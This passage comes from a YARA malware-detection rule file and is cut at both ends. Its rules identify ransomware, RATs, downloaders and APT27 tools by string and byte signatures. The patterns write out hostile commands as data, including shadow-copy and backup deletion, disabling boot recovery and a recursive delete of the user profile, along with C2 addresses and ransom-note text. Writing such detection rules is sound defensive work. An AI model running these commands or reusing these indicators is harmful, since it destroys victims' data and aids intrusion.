$pe1 = "(77,90," ascii
$pe2 = "='4D5A" ascii
condition:
all of ($s*) and (#pe1 > 1 or #pe2 > 1) and #s1 > 4
}
rule SSC_Win_PELoader_RunPE {
meta:
author = "ditekSHen"
description = "Detects PE loader / injector. Observed Gorgon TTPs"
strings:
$s1 = "commandLine'" fullword ascii
$s2 = "RunPe.dll" fullword ascii
$s3 = "HandleRun" fullword ascii
$s4 = "inheritHandles" fullword ascii
$s5 = "BlockCopy" fullword ascii
$s6 = "WriteProcessMemory" fullword ascii
$s7 = "startupInfo" fullword ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_PELoader_INF {
meta:
author = "ditekSHen"
description = "Detects PE loader / injector. Potentical HCrypt. Observed Gorgon TTPs"
strings:
$x1 = "Managament.inf" fullword ascii
$x2 = "rOnAlDo" fullword ascii
$x3 = "untimeResourceSet" fullword ascii
$x4 = "3System.Resources.Tools.StronglyTypedResourceBuilder" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_DLAgent08 {
meta:
author = "ditekSHen"
description = "Detects known downloader agent downloading encoded binaries in patches"
snort2_sid = "920122"
snort3_sid = "920119"
strings:
$pat = /\/base\/[A-F0-9]{32}\.html/ ascii wide
condition:
uint16(0) == 0x5a4d and $pat and #pat > 1
}
rule SSC_Win_DoejoCrypt {
meta:
author = "ditekSHen"
description = "Detects DoejoCrypt / DearCry ransomware"
strings:
$s1 = "DEARCRY!" fullword ascii
$s2 = ".CRYPT" fullword ascii
$s3 = "\\EncryptFile -svcV2\\" ascii
$s4 = "please send me the following hash!" ascii
$s5 = "dear!!!" fullword ascii
$s6 = "/readme.txt" fullword ascii
$o1 = { c3 8b 65 e8 c7 45 fc fe ff ff ff 8b b5 f4 e9 ff }
$o2 = { 0f 8c 27 ff ff ff 33 db 57 e8 7b 36 00 00 eb 0a }
$o3 = { 0f 8c 2a ff ff ff 53 57 e8 b7 42 00 00 8b 4c 24 }
condition:
uint16(0) == 0x5a4d and 4 of ($s*) or (all of ($o*) and (2 of ($s*)))
}
rule SSC_Win_SunShuttle {
meta:
author = "ditekSHen"
description = "Detects SunShuttle / GoldMax"
strings:
$s1 = "main.beaconing" fullword ascii
$s2 = "main.clean_file" fullword ascii
$s3 = "main.decrypt" fullword ascii
$s4 = "main.define_internal_settings" fullword ascii
$s5 = "main.delete_empty" fullword ascii
$s6 = "main.encrypt" fullword ascii
$s7 = "main.false_requesting" fullword ascii
$s8 = "main.removeBase64Padding" fullword ascii
$s9 = "main.resolve_command" fullword ascii
$s10 = "main.retrieve_session_key" fullword ascii
$s11 = "main.save_internal_settings" fullword ascii
$s12 = "main.send_command_result" fullword ascii
$s13 = "main.send_file_part" fullword ascii
$s14 = "main.wget_file" fullword ascii
$s15 = "main.write_file" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_RanzyLocker {
meta:
author = "ditekSHen"
description = "Detects RanzyLocker / REntS ransomware"
strings:
$hr1 = "776261646D696E2044454C4554452053595354454D53544154454241434B5550" ascii                             // wbadmin DELETE SYSTEMSTATEBACKUP
$hr2 = "776D69632E65786520534841444F57434F5059202F6E6F696E746572616374697665" ascii                         // wmic.exe SHADOWCOPY /nointeractive
$hr3 = "626364656469742E657865202F736574207B64656661756C747D207265636F76657279656E61626C6564204E6F" ascii   // bcdedit.exe /set {default} recoveryenabled No
$hr4 = "776261646D696E2044454C4554452053595354454D53544154454241434B5550202D64656C6574654F6C64657374" ascii // wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest
$hr5 = "626364656469742E657865202F736574207B64656661756C747D20626F6F74737461747573706F6C6963792069676E6F7265616C6C6661696C75726573" ascii // bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
$hr6 = "76737361646D696E2E6578652044656C65746520536861646F7773202F416C6C202F5175696574" ascii               // vssadmin.exe Delete Shadows /All /Quiet
$hx1 = "476C6F62616C5C33353335354641352D303745392D343238422D423541352D314338384341423242343838" ascii        // Global\35355FA5-07E9-428B-B5A5-1C88CAB2B488 (mutex)
$hx2 = "534F4654574152455C4D6963726F736F66745C45524944" ascii                                               // SOFTWARE\Microsoft\ERID
$hx3 = "227375626964223A22" ascii // subid
$hx4 = "226E6574776F726B223A22" ascii // network
$hx5 = "726561646D652E747874" ascii // readme.txt
$hx6 = "-nolan" fullword wide
$o1 = { 8d 45 e9 89 9d 54 ff ff ff 88 9d 44 ff ff ff 3b }
$o2 = { 8b 44 24 2? 8b ?c 24 34 40 8b 54 24 38 89 44 24 }
$o3 = { 8b 44 24 2? 8b ?c 24 1c 89 44 24 34 8b 44 24 28 }
$o4 = { 8b 44 24 2? 8b ?c 24 34 05 00 00 a0 00 89 44 24 }
condition:
uint16(0) == 0x5a4d and (all of ($hx*) or (2 of ($hr*) and 2 of ($hx*)) or (all of ($o*) and 2 of ($h*)))
}
rule SSC_Win_WobbyChipMBR {
meta:
author = "ditekSHen"
description = "Detects WobbyChipMBR / Covid-21 ransomware"
strings:
$x1 = "You became a Victim of the Covid-21 Ransomware" ascii wide
$x2 = "Reinstalling Windows has been blocked" ascii wide
$x3 = "Enter Decryption Key:" ascii wide
$x4 = "encrypted with military grade encryption" ascii wide
$s1 = "schtasks.exe /Create /TN wininit /ru SYSTEM /SC ONSTART /TR" ascii
$s2 = "\\EFI\\Boot\\bootx64.efi" ascii wide
$s3 = "DumpHex" fullword ascii
$s4 = "TFTP Error" fullword wide
$s5 = "HD(Part%d,MBRType=%02x,SigType=%02x)" fullword wide
condition:
uint16(0) == 0x5a4d and (3 of ($x*) or all of ($s*) or (1 of ($x*) and 2 of ($s*)))
}
rule SSC_Win_Snatch {
meta:
author = "ditekSHen"
description = "Detects Snatch / GoRansome / MauriGo ransomware"
strings:
$s1 = "main.encryptFile" ascii
$s2 = "main.encryptFileExt" ascii
$s3 = "main.deleteShadowCopy" ascii
$s4 = "main.Shadow" fullword ascii
$s5 = "main.RecoverMe" fullword ascii
$s6 = "main.EncryptWithPublicKey" ascii
$s7 = "main.EncoderLookupDir" fullword ascii
$s8 = "main.ALIGNUP" fullword ascii
$s9 = "main.encrypt" fullword ascii
$s10 = "github.com/mauri870/ransomware" ascii
$m1 = "Dear You, ALl Your files On YOUR network computers are encrypted" ascii
$m2 = "You have to pay the ransom of %s USD in bitcoins to the address" ascii
$m3 = "REMEMBER YOU FILES ARE IN SAVE HANDS AND WILL BE RESTORED OR RECOVERED ONCE PAYMENT IS DONE" ascii
$m4 = ":HELP FEEED A CHILD:" ascii
$m5 = ">SYSTEM NETWORK ENCRYPTED<" ascii
$m6 = "YOUR IDENTIFICATION : %s" ascii
$m7 = "convince you of our honesty" ascii
$m8 = "use TOR browser to talk with support" ascii
$m9 = "encrypted and attackers are taking" ascii
$p1 = "/Go/src/kitty/kidrives/" ascii
$p2 = "/LGoGo/encoder.go" ascii nocase
$p3 = "/Go/src/kitty/kidata/" ascii
condition:
uint16(0) == 0x5a4d and (3 of ($s*) or 2 of ($m*) or (1 of ($m*) and 1 of ($s*)) or (all of ($p*) and (1 of ($s*) or 1 of ($m*))))
}
rule SSC_Win_Meteorite {
meta:
author = "ditekSHen"
description = "Detects Meteorite downloader"
strings:
$x1 = "MeteoriteDownloader" fullword ascii wide
$x2 = "Meteorite Downloader" fullword ascii wide
$x3 = "Meteorite Downloader v" wide
$s1 = "regwrite" fullword wide
$s2 = "urlmon" fullword ascii
$s3 = "wscript.shell" fullword wide
$s4 = "modMain" fullword ascii
$s5 = "VBA6.DLL" fullword ascii
$s6 = "^_http" ascii
condition:
uint16(0) == 0x5a4d and (1 of ($x*) or (5 of ($s*)))
}
rule SSC_Win_LegionLocker {
meta:
author = "ditekSHen"
description = "Detects LegionLocker ransomware"
strings:
$m1 = "+Do not run task manager, powershell, cmd etc." ascii wide
$m2 = "3 hours your files will be deleted." ascii wide
$m3 = "files have been encrypted by Legion Locker" ascii wide
$s1 = "passwordBytes" fullword ascii
$s2 = "_start_enc_" ascii
$s3 = "_del_desktop_" ascii
$s4 = "Processhacker" wide
$s5 = "/k color 47 && del /f /s /q %userprofile%\\" wide
$s6 = "Submit code" fullword wide
$pdb1 = "\\obj\\Debug\\LegionLocker.pdb" ascii
$pdb2 = "\\obj\\Release\\LegionLocker.pdb" ascii
condition:
uint16(0) == 0x5a4d and (1 of ($m*) or 1 of ($pdb*) or 4 of ($s*))
}
rule SSC_Win_DLAgentGo {
meta:
author = "ditekSHen"
description = "Detects Go-based downloader"
strings:
$s1 = "main.downloadFile" fullword ascii
$s2 = "main.fetchFiles" fullword ascii
$s3 = "main.createDefenderAllowanceException" fullword ascii
$s4 = "main.unzip" fullword ascii
$s5 = "HideWindow" fullword ascii
$s6 = "/go/src/installwrap/main.go" ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_BlackMoon {
meta:
author = "ditekSHen"
description = "Detects executables using BlackMoon RunTime"
strings:
$s1 = "blackmoon" fullword ascii
$s2 = "BlackMoon RunTime Error:" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_IceID {
meta:
author = "ditekSHen"
description = "Detects IceID / Bokbot variants"
strings:
$n1 = "POST" fullword wide
$n2 = "; _gat=" fullword wide
$n3 = "; _ga=" fullword wide
$n4 = "; _u=" fullword wide
$n5 = "; __io=" fullword wide
$n6 = "; _gid=" fullword wide
$n7 = "Cookie: __gads=" fullword wide
$s1 = "c:\\ProgramData" ascii
$s2 = "loader_dll_64.dll" fullword ascii
$s3 = "loader_dll_32.dll" fullword ascii
$s4 = "/?id=%0.2X%0.8X%0.8X%s" ascii
$s5 = "%0.2X%0.2X%0.2X%0.2X%0.2X%0.2X%0.8X" ascii
condition:
uint16(0) == 0x5a4d and ((all of ($n*) and 1 of ($s*)) or (3 of ($s*) and 1 of ($n*)))
}
rule SSC_Win_Purge {
meta:
author = "ditekSHen"
description = "Detects Purge ransomware"
strings:
$n1 = "imagesave/imagesize.php" ascii
$n2 = "imageinfo.html" ascii
$n3 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" ascii
$n4 = "Content-Type: application/x-www-form-urlencoded" ascii
$m1 = "YOUR_ID: %x%x" wide
$m2 = "Specially for your PC was generated personal" wide
$m3 = "which is on our Secret Server" wide
$m4 = "wait for a miracle and get your price" wide
$s1 = "%s\\SpyHunter Remove Ransomware" wide
$s2 = "$recycle.bin" fullword wide
$s3 = "TheEnd" fullword wide
$s4 = "%s\\HELP_DECRYPT_YOUR_FILES.TXT" fullword wide
$s5 = "%s.id_%x%x_email_" wide
$s6 = "scmd" fullword wide
$s7 = "process call create \"%s\"" wide
$s8 = "FinishEnds" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or all of ($n*) or 2 of ($m*) or (3 of ($s*) and (1 of ($n*) or 1 of ($m*))))
}
rule SSC_Win_DarkTrackRAT {
meta:
author = "ditekSHen"
description = "Detects OzoneRAT / DarkTrack / DarkSky"
strings:
$x1 = "Klog.dat" ascii
$x2 = "I_AM_DT" ascii
$x3 = " Alien" ascii
$x4 = "Local Victim" ascii
$x5 = "Dtback\\AlienEdition\\Server\\SuperObject.pas" ascii
$x6 = "].encryptedUsername" ascii
$x7 = "].encryptedPassword" ascii
$x8 = { 49 41 4d [6] 44 41 52 [0-2] 4b [6] 44 54 41 43 4b }
$s1 = "AntiVirusProduct" ascii
$s2 = "AntiSpywareProduct" ascii
$s3 = "ConnectServer" ascii
$s4 = "ExecQuery" ascii
$s5 = "\\Drivers\\Etc\\Hosts" fullword ascii
$s6 = "BTMemoryLoadLibary: Get DLLEntyPoint" ascii
$s7 = "\\\\.\\SyserDbgMsg" fullword ascii
$s8 = "\\\\.\\SyserBoot" fullword ascii
condition:
uint16(0) == 0x5a4d and (4 of ($x*) or 6 of ($s*))
}
rule SSC_Win_Godzilla {
meta:
author = "ditekSHen"
description = "Detects Godzilla loader"
strings:
$x1 = "MSVBVM60.DLL" fullword ascii
$x2 = "Loginserver8" fullword ascii
$x3 = "Proflogger7" fullword ascii
$s1 = "Badgeless5" fullword ascii
$s2 = "Montebrasite3" fullword ascii
$s3 = "Atelomyelia4" fullword ascii
$s4 = "Xxencoded5" fullword ascii
$s5 = "Garneau2" fullword ascii
$s6 = "Hypostasis0" fullword ascii
$s7 = "Piarhemia4" fullword ascii
$s8 = "Foredestine8" fullword ascii
condition:
uint16(0) == 0x5a4d and all of ($x*) and 2 of ($s*)
}
rule SSC_Win_UNK03 {
meta:
author = "ditekSHen"
description = "Detects unknown malware"
strings:
$s1 = "Software\\Microsoft\\Windows\\CurrentVersion" ascii
$s2 = "rundll32.exe C:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen %s" ascii
$s3 = "%s.jpg" ascii
$s4 = "%s\\sz.txt" ascii
$s5 = "ChromeSecsv9867%d7.exe" ascii
$s6 = "%s\\appl%c.jpg" ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_UNK04 {
meta:
author = "ditekSHen"
description = "Detects unknown malware (proxy tool)"
strings:
$x1 = "127.0.0.1/%d" fullword ascii
$x2 = "SYSTEM\\CurrentControlSet\\SERVICES\\PORTPROXY\\V4TOV4\\TCP" fullword ascii
$x3 = "%s rundll32.exe" fullword ascii
$s1 = "kxetray.exe" fullword ascii
$s2 = "ksafe.exe" fullword ascii
$s3 = "Mcshield.exe" fullword ascii
$s4 = "Miner.exe" fullword ascii
condition:
uint16(0) == 0x5a4d and all of ($x*) and 2 of ($s*)
}
rule SSC_Win_Karkoff {
meta:
author = "ditekSHen"
description = "Detects Karkoff"
strings:
$x1 = "C:\\Windows\\Temp\\MSEx_log.txt" fullword wide
$x2 = "CMD.exe" fullword wide
$x3 = "Karkoff.ProjectInstaller.resources" fullword ascii
$s1 = /try\shttp(s)?\s(ip|domain)/ fullword wide
$s2 = "Reg cleaned!" fullword wide nocase
$s3 = "Content-Disposition: form-data; name=\"{1}\"" fullword wide
$s4 = "^[A-Fa-f0-9]{8}-([A-Fa-f0-9]{4}-){3}[A-Fa-f0-9]{12}$" fullword wide
$s5 = "new backdoor" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($x*) or 4 of ($s*) or (2 of ($x*) and 2 of ($s*)))
}
rule SSC_Win_DLAgent09 {
meta:
author = "ditekSHen"
description = "Detects known downloader agent"
strings:
$h1 = "//:ptth" ascii wide nocase
$h2 = "//:sptth" ascii wide nocase
$s1 = "DownloadString" fullword ascii wide
$s2 = "StrReverse" fullword ascii wide
$s3 = "FromBase64String" fullword ascii wide
$s4 = "WebClient" fullword ascii wide
condition:
uint16(0) == 0x5a4d and (1 of ($h*) and all of ($s*))
}
rule SSC_Win_CoinMiningBot {
meta:
author = "ditekSHen"
description = "Detects coinmining bot"
strings:
$s1 = "FullScreenDetect" fullword ascii
$s2 = "GetChildProcesses" fullword ascii
$s3 = "HideBotPath" fullword ascii
$s4 = "Inject" fullword ascii
$s5 = "DownloadFile" fullword ascii
$s6 = "/Data/GetUpdateInfo" wide
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_FYAnti {
meta:
author = "ditekSHen"
description = "Hunt for FYAnti third-stage loader DLLs"
condition:
uint16(0) == 0x5a4d and pe.is_dll() and pe.exports("FuckYouAnti")
}
rule SSC_Win_DLAgent10 {
meta:
author = "ditekSHen"
description = "Detects known downloader agent"
strings:
$s1 = "powershell.exe" ascii wide nocase
$s2 = ".DownloadFile(" ascii wide nocase
$s3 = "_UseShellExecute" ascii wide nocase
$s4 = "_CreateNoWindow" ascii wide nocase
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_PureLoader {
meta:
author = "ditekSHen"
description = "Detects Pure loader / injector"
strings:
$s1 = "InvokeMember" fullword wide
$s2 = "ConcatProducer" fullword wide
$s3 = ".Classes.Resolver" wide
$s4 = "get_DLL" fullword ascii
$s5 = "BufferedStream" fullword ascii
$s6 = "GZipStream" fullword ascii
$s7 = "MemoryStream" fullword ascii
$s8 = "Decompress" fullword ascii
$s9 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
condition:
uint16(0) == 0x5a4d and 8 of them
}
rule SSC_Win_VBS_DLAgent01 {
meta:
author = "ditekSHen"
description = "Detects VBS MSHTA downloader"
strings:
$s1 = "llehS.tpircsW" ascii
$s2 = ".Run" ascii
$s3 = "mshta http" ascii nocase
$s4 = "StrReverse" ascii
condition:
all of them
}
rule SSC_Win_RanumBot {
meta:
author = "ditekSHen"
description = "Detects RanumBot / Windigo / GoStealer"
strings:
// variant 1
$f1 = "main.addSchedulerTaskSSH" fullword ascii
$f2 = "main.attackRouter" fullword ascii
$f3 = "main.decryptPassword" fullword ascii
$f4 = "main.handleScanRequest" fullword ascii
$f5 = "main.scanNetwork" fullword ascii
$f6 = "main.extractCredentials" fullword ascii
$s1 = "H_T= H_a= H_g= MB,  W_a= and  h_a= h_g= h_t= max= ptr  siz= tab= top= u_a= u_g=%s/16%s:%d%s:22+0330+0430+0530+0545+0630+0845+10" ascii
$s2 = "<== as  at  fp= is  lr: of  on  pc= sp: sp=) = ) m=+Inf, n -Inf00%x112212343125: p=ABRTACDTACSTAEDTAESTAKDTAKSTALRMAWSTAhomAtoiCESTChamDashEESTGOGCJulyJuneKILLLEAFLisuMiaoModiNZDTNZSTNewaPIPEQUITSASTSEGVTERMThai" ascii
$s3 = "W*struct { P *big.Int; Q *big.Int; G *big.Int; Y *big.Int; Rest []uint8 \"ssh:\\\"rest\\\"\" }" ascii
$s4 = "policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write" ascii
$s5 = "/Users/alexander/go/src/mikrotik/winbox.go" ascii
// variant 2
$xf1 = "main.readConfig" fullword ascii
$xf2 = "main.ensureRunningAsUser" fullword ascii
$xf3 = "main.configRegPath" fullword ascii
$xf4 = "main.oldConfigRegPath" fullword ascii
$uf1 = "main.locateChrome" fullword ascii
$uf2 = "main.decryptAndUploadProfile" fullword ascii
$uf3 = "main.decryptCookies" fullword ascii
$uf4 = "main.extractPasswords" fullword ascii
$uf5 = "main.getFirefoxProfile" fullword ascii
$uf6 = "main.postBrowsersData" fullword ascii
$uf7 = "main.uploadFirefoxProfile" fullword ascii
$uf8 = "main.zipFirefoxProfile" fullword ascii
$uf9 = /main\.detect(Browsers|Chrome|Coccoc|Edge|Firefox|InternetExplorer|Opera|Yandex)/ fullword ascii
condition:
uint16(0) == 0x5a4d and (5 of ($f*) or 4 of ($s*) or (2 of ($f*) and 2 of ($s*)) or (all of ($xf*) and 1 of ($uf*)) or 6 of ($uf*))
}
rule SSC_Win_DllHijacker01 {
meta:
author = "ditekSHen"
description = "Hunt for VSNTAR21 / DllHijacker01 IronTiger / LuckyMouse / APT27 malware"
strings:
$s1 = "libvlc_add_intf" fullword ascii
$s2 = "libvlc_dllonexit" fullword ascii
$s3 = "libvlc_getmainargs" fullword ascii
$s4 = "libvlc_initenv" fullword ascii
$s5 = "libvlc_set_app_id" fullword ascii
$s6 = "libvlc_set_app_type" fullword ascii
$s7 = "libvlc_set_user_agent" fullword ascii
$s8 = "libvlc_wait" fullword ascii
$s9 = "dll.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_HyperBro02 {
meta:
author = "ditekSHen"
description = "Detects HyperBro IronTiger / LuckyMouse / APT27 malware"
strings:
$s1 = "\\cmd.exe /A" fullword wide
$s2 = "C:\\windows\\explorer.exe" fullword wide
$s3 = "\\\\.\\pipe\\testpipe" fullword wide
$s4 = "Elevation:Administrator!new:{" wide
$s5 = "log.log" fullword wide
$s6 = "%s\\%d.exe" fullword wide
$s7 = ".?AVTPipeProtocol@@" fullword ascii
$s8 = ".?AVTCaptureMgr@@" fullword ascii
$s9 = "system-%d" fullword wide
$s10 = "[test] %02d:%02d:%02d:%03d %s" fullword wide
$s11 = "\\..\\data.dat" fullword wide
$s12 = "\\..\\config.ini" fullword wide
$s13 = { 73 00 76 00 63 00 68 00 6f 00 73 00 74 00 2e 00 65 00 78 00 65 00 00 00 20 00 2d 00 77 00 6f 00 72 00 6b 00 65 00 72 00 }
$s14 = { 73 00 76 00 63 00 68 00 6f 00 73 00 74 00 2e 00 65 00 78 00 65 00 00 00 20 00 2d 00 64 00 61 00 65 00 6d 00 6f 00 6e 00 }
$cnc1 = "https://%s:%d/ajax" fullword wide
$cnc2 = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36" fullword wide
$cnc3 = "139.180.208.225" fullword wide
condition:
uint16(0) == 0x5a4d and (7 of ($s*) or (2 of ($cnc*) and 2 of ($s*)))
}
rule SSC_Win_DllHijacker02 {
meta:
author = "ditekSHen"
description = "Detects ServiceCrt / DllHijacker03 IronTiger / LuckyMouse / APT27 malware"
strings:
$s1 = "ServiceCrtMain" fullword ascii
$s2 = "mpsvc.dll" fullword ascii
$o1 = { 84 db 0f 85 4c ff ff ff e8 14 06 00 00 8b f0 83 }
$o2 = { f7 c1 00 ff ff ff 75 c5 eb 13 0f ba 25 10 20 01 }
$o3 = { 8d 04 b1 8b d9 89 45 fc 8d 34 b9 a1 18 20 01 10 }
$o4 = { b0 01 c3 68 b8 2c 01 10 e8 83 ff ff ff c7 04 24 }
$o5 = { eb 34 66 0f 12 0d 00 fe 00 10 f2 0f 59 c1 ba cc }
$o6 = { 73 c7 dc 0d 4c ff 00 10 eb bf dd 05 34 ff 00 10 }
condition:
uint16(0) == 0x5a4d and all of ($s*) and 5 of ($o*)
}
rule SSC_Win_Zeoticus {
meta:
author = "ditekSHen"
description = "Detects Zeoticus ransomware"
strings:
$s1 = "Dear %s" fullword wide
$s2 = "\\??\\UNC\\%s\\%s\\" wide
$s3 = "\\\\%ws\\admin$\\%ws" wide
$s4 = "%s /node:\"%ws\" /user:\"%ws\" /password:" wide
$s5 = "process call create" wide
$s6 = ">----===Zeoticus" ascii
$s7 = "ZEOTICUSV2" ascii
$s8 = "GetExtendedTcpTable" fullword ascii
$s9 = "SHAMROckSWTF" ascii
$s10 = "NTDLL.RtlAllocateHeap" fullword ascii
$s11 = ".pandora" fullword wide
$s12 = { 70 00 20 00 72 00 20 00 69 00 20 00 76 00 20 00 65 00 20 00 74 }
$pdb = "_cryptor\\shell_gen\\Release\\" ascii
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or ($pdb))
}
rule SSC_Win_DLAgent11 {
meta:
author = "ditekSHen"
description = "Detects downloader agent"
strings:
$pdb = "\\loader2\\obj\\Debug\\loader2.pdb" ascii
$s1 = "DownloadFile" fullword ascii
$s2 = "ZipFile" fullword ascii
$s3 = "WebClient" fullword ascii
$s4 = "ExtractToDirectory" fullword ascii
$s5 = "System Clear" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (($pdb) and 4 of ($s*)))
}
rule SSC_Win_SoftCNApp {
meta:
author = "ditekSHen"
description = "Detects SoftCNApp"
strings:
$s1 = "\\\\.\\PIPE\\SOC%d" fullword ascii
$s2 = "Mozilla/5.0 (Windows NT 6.1)" fullword ascii
$s3 = "Param: sl=%d; sl=%d; sl=%d; sl=%d; sl=%d;" fullword ascii
$s4 = ".?AVCHPPlugin@@" fullword ascii
$s5 = ".?AVCHPCmd@@" fullword ascii
$s6 = ".?AVCHPExplorer@@" fullword ascii
$s7 = "%s\\svchost.exe -O" fullword wide
$s8 = "\"%s\\%s\" -P" fullword ascii
$n1 = "45.63.58.34" fullword ascii
$n2 = "127.0.0.1" fullword ascii
condition:
uint16(0) == 0x5a4d and (4 of ($s*) or (all of ($n*) and 2 of ($s*)))
}
rule SSC_Win_CovenantGruntStager {
meta:
author = "ditekSHen"
description = "Detects Covenant Grunt Stager"
strings:
$x1 = "VXNlci1BZ2VudA" ascii wide
$x2 = "cGFnZT17R1VJRH0mdj0x" ascii wide
$x3 = "0eXBlPXtHVUlEfSZ2PTE" ascii wide
$x4 = "tZXNzYWdlPXtHVUlEfSZ2PTE" ascii wide
$x5 = "L2VuLXVzL" ascii wide
$x6 = "L2VuLXVzL2luZGV4Lmh0bWw" ascii wide
$x7 = "L2VuLXVzL2RvY3MuaHRtbD" ascii wide
$s1 = "ExecuteStager" ascii
$s2 = "UseCertPinning" fullword ascii
$s3 = "FromBase64String" fullword ascii
$s4 = "ToBase64String" fullword ascii
$s5 = "DownloadString" fullword ascii
$s6 = "UploadString" fullword ascii
$s7 = "GetWebRequest" fullword ascii
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or all of ($s*) or (1 of ($x*) and 5 of ($s*)))
}
rule SSC_Win_Fabookie {
meta:
author = "ditekSHen"
description = "Detects Fabookie / ElysiumStealer"
strings:
$s1 = "rwinssyslog" fullword wide
$s2 = "_kasssperskdy" fullword wide
$s3 = "[Title:%s]" fullword wide
$s4 = "[Execute]" fullword wide
$s5 = "[Snapshot]" fullword wide
$s6 = "Mozilla/4.0 (compatible)" fullword wide
$s7 = "d-k netsvcs" fullword wide
$s8 = "facebook.websmails.com" fullword wide
$s9 = "CUdpClient::Start" fullword ascii
condition:
(uint16(0) == 0x5a4d or uint16(0) == 0x0805) and 6 of them
}
rule SSC_Win_CobianRAT {
meta:
author = "ditekSHen"
description = "Detects CobianRAT, a fork of Njrat"
strings:
$s1 = "1.0.40.7" fullword wide
$s2 = "DownloadData" fullword wide
$s3 = "Executed As" fullword wide
$s4 = "\\Plugins" fullword wide
$s5 = "LOGIN" fullword wide
$s6 = "software\\microsoft\\windows\\currentversion\\run" wide
$s7 = "Hidden" fullword wide
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_Cuba {
meta:
author = "ditekSHen"
description = "Detects Cuba ransomware"
strings:
$s1 = ".cuba" fullword wide
$s2 = "\\\\%d.%d.%d.%d" fullword wide
$s3 = "!!FAQ for Decryption!!.txt" fullword wide
$s4 = "vmcompute" fullword wide
$s5 = "MSExchange" wide
$s6 = "glocal" fullword wide
$s7 = "network" fullword wide
$s8 = "\\$Recycle.Bin\\" fullword wide
$s9 = "NetShareEnum" fullword ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_Leivion {
meta:
author = "ditekSHen"
description = "Detects Leivion"
strings:
$s1 = "/var/lib/veil/go/src/runtime/mem_windows.go" fullword ascii
$s2 = "/var/lib/veil/go/src/internal/singleflight/singleflight.go" fullword ascii
$s3 = "/var/lib/veil/go/src/net/http/sniff.go" fullword ascii
$s4 = "/var/lib/veil/go/src/net/sendfile_windows.go" fullword ascii
$s5 = "/var/lib/veil/go/src/os/exec_" ascii
$s6 = "/var/lib/veil/go/src/runtime/mgcsweep.go" fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_Banload {
meta:
author = "ditekSHen"
description = "Detects Banload"
strings:
$s1 = "main.die" fullword ascii
$s2 = "main.postResults" fullword ascii
$s3 = "main.checkin" fullword ascii
$s4 = "RegQueryValueExWRemoveDirectoryWSETTINGS_TIMEOUTTerminateProcessUpgrade RequiredUser-Agent: %s" ascii
$s5 = "pcuser-agentws2_32.dll (targetpc= DigestType ErrCode=%v" ascii
$s6 = "invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrie" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_TYRAT {
meta:
author = "ditekSHen"
description = "Detects TYRAT"
strings:
$s1 = "C:\\$MSIRecycle.Bin\\" fullword ascii
$s2 = "Range: bytes=%d-" fullword ascii
$s3 = "GET%sHTTP/1.1" fullword ascii
$s4 = "DllServer.dll" fullword ascii
$s5 = ".Bin\\bnch" ascii
$s6 = "User-Agent: wget" fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_InfinityLock {
meta:
author = "ditekSHen"
description = "Detects InfinityLock ransomware"
strings:
$s1 = "_Encrypted$" fullword ascii
$s2 = "PublicKeyToken=" fullword ascii nocase
$s3 = "GenerateHWID" fullword ascii
$s4 = "CreateKey" fullword ascii
$d1 = "ProgrammFiles" fullword ascii
$d2 = "OneDrive" fullword ascii
$d3 = "ProgrammsX86" fullword ascii
$d4 = "UserDirs" fullword ascii
$d5 = "B_Drive" fullword ascii
$pdb1 = "F:\\DESKTOP!\\ChkDsk\\ChkDsk\\obj\\" ascii
$pdb2 = "\\ChkDsk\\obj\\Debug\\PremiereCrack.pdb" ascii
condition:
uint16(0) == 0x5a4d and ((all of ($s*) and 1 of ($d*)) or (4 of ($d*) and 2 of ($s*)) or (any of ($pdb*) and 1 of ($s*) and 1 of ($d*)))
}
rule SSC_Win_MountLocker {
meta:
author = "ditekSHen"
description = "Detects MountLocker ransomware"
strings:
$s1 = "] locker.dir.check > " ascii wide
$s2 = "] locekr.kill." ascii wide
$s3 = "] locker.worm" ascii wide
$s4 = "%CLIENT_ID%" fullword ascii
$s5 = "RecoveryManual.html" ascii wide
$s6 = "RECOVERY MANUAL" ascii
$s7 = ".ReadManual.%0.8X" ascii wide
$s8 = "/?cid=%CLIENT_ID%" ascii
condition:
uint16(0) == 0x5a4d and 3 of them
}
rule SSC_Win_PingBack {
meta:
author = "ditekSHen"
description = "Detects PingBack ICMP backdoor"
strings:
$s1 = "Sniffer ok!" fullword ascii
$s2 = "recv icmp packet!" fullword ascii
$s3 = "WSASocket() failed: %d" fullword ascii
$s4 = "file on remote computers success" ascii
$s5 = "listen port error!" fullword ascii
$s6 = "\\PingBackService" ascii
$c1 = "exec" fullword ascii
$c2 = "rexec" fullword ascii
$c3 = "exep" fullword ascii
$c4 = "download" fullword ascii
$c5 = "upload" fullword ascii
$c6 = "shell" fullword ascii
condition:
